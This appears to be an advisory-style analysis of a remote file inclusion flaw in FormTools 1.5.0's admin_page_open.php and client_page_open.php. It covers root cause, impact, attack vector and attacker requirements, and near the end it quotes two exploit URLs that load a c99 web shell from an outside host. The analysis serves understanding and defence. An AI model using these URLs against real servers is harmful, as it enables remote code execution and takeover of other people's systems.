Based on the provided content, here's a breakdown of the vulnerability:

*   **Root cause of vulnerability:** The vulnerability lies in the insecure inclusion of files in `admin_page_open.php` and `client_page_open.php`. Specifically, the `$g_root_dir` variable, which is used in `require()` statements, is not properly sanitized and can be controlled by an attacker via a GET parameter.

*   **Weaknesses/vulnerabilities present:**
    *   **Remote File Inclusion (RFI):** The application uses a user-supplied parameter (`g_root_dir`) to include files, allowing the attacker to include arbitrary remote files.

*   **Impact of exploitation:**
    *   **Arbitrary Code Execution:** By including a malicious remote file (e.g., a shell), an attacker can execute arbitrary code on the server hosting the vulnerable application.

*   **Attack vectors:**
    *   **HTTP GET request:** The attacker crafts a malicious URL with a `g_root_dir` parameter pointing to a remote file containing malicious code.

*  **Required attacker capabilities/position:**
    *   The attacker needs to be able to send HTTP requests to the vulnerable server. They need to know or be able to discover the path to the vulnerable scripts (`admin_page_open.php` or `client_page_open.php`). They also need to have access to a server they can host their malicious PHP file on.

**Additional Details**

The exploit examples in the provided content demonstrates how to exploit the vulnerability:

```
www.RxH.com/FormTools1_5_0/global/templates/admin_page_open.php?g_root_dir=http://no-hack.fr/shells/c99.txt?
And Here
www.RxH.com/FormTools1_5_0/global/templates/client_page_open.php?g_root_dir=http://no-hack.fr/shells/c99.txt?
```

These URLs show how an attacker would replace the expected `$g_root_dir` value with a URL pointing to a malicious file hosted on the attacker's server (`http://no-hack.fr/shells/c99.txt`).
